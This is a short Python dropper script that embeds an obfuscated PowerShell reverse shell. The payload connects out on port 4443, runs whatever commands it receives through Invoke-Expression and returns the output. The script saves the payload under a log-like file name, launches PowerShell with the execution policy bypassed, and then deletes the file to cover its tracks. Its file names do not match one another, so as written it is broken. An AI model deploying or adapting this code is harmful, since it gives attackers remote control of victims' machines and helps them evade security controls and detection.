import os
import subprocess

# The obfuscated PowerShell payload
payload = """
$__0xA0="";$__0xA1=4443; $__0xA2=New-Object Net.Sockets.TCPClient($__0xA0,$__0xA1); $__0xA3=$__0xA2.GetStream(); $__0xA4=New-Object IO.StreamReader($__0xA3); $__0xA5=New-Object IO.StreamWriter($__0xA3); $__0xA5.AutoFlush=$true; $__0xA6=New-Object System.Byte[] 1024; while ($__0xA2.Connected){while ($__0xA3.DataAvailable){ $__0xA7=$__0xA3.Read($__0xA6,0,$__0xA6.Length); $__0xA8=([text.encoding]::UTF8).GetString($__0xA6,0,$__0xA7-1)}; if ($__0xA2.Connected -and $__0xA8.Length -gt 1){ $__0xA9=try {Invoke-Expression ($__0xA8) 2>&1 } catch { $_ }; $__0xA5.Write("$__0xA9`n"); $__0xA8=$null}}; $__0xA2.Close(); $__0xA3.Close(); $__0xA4.Close(); $__0xA5.Close()
"""

# Write the payload to a temporary PowerShell script file
with open("Logfiles.ps1", "w") as file:
    file.write(payload)

# Execute the PowerShell script
subprocess.run(["powershell.exe", "-ExecutionPolicy", "Bypass", "-File", "payload.ps1"], check=True)

# Optionally, delete the payload file
os.remove("logfiles.ps1")
